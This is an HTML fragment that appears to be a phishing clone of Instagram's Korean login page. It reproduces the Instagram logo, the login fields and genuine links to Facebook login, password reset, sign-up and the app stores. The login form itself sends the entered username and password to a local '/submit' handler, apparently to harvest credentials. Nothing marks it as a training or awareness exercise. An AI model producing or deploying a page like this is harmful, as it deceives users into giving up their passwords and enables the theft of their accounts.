<div class="wrapper">

        <img src="images\PcImage-removebg-preview.png" alt="Your Image" style="width: 100%;">

        <div class="top">
            <div class="logo">
                <img src="images/instagram.png" alt="instagram" style="width: 175px;">
            </div>
            <div class="form">
                <form action="/submit" method="post">
                    <div class="input_field">
                        <input type="text" name="username" placeholder="전화 번호, 사용자 이름 또는 이메일" class="input" required>
                    </div>
                    <div class="input_field">
                        <input type="password" name="password" placeholder="암호" class="input" required>
                    </div>
                    <div class="btn"><button type="submit">로그인</button></div>
                </form>
            </div>
            <div class="or">
                <div class="line"></div>
                <p>또는</p>
                <div class="line"></div>
            </div>
            <div class="dif">
                <div class="fb">
                    <img src="images/facebook.png" alt="facebook">
                    <a href="https://www.facebook.com/login.php">ㅤFacebook으로 로그인</a>
                </div>
                <div class="forgot">
                    <a href="https://www.instagram.com/accounts/password/reset/">비밀번호를 잊으셨나요?</a>
                </div>
            </div>
        </div>
        <div class="signup">
            <p>계정이 없으신가요? <a href="https://www.instagram.com/accounts/emailsignup/">가입하기</a></p>
        </div>
        <div class="apps">
            <p>앱을 다운로드하세요.</p>
            <div class="icons">
                <a href="https://apps.apple.com/us/app/instagram/id389801252"><img src="images/appstore.png" alt="appstore"></a>
                <a href="https://play.google.com/store/apps/details?id=com.instagram.android"><img src="images/googleplay.png" alt="googleplay"></a>
            </div>
        </div>
    </div>
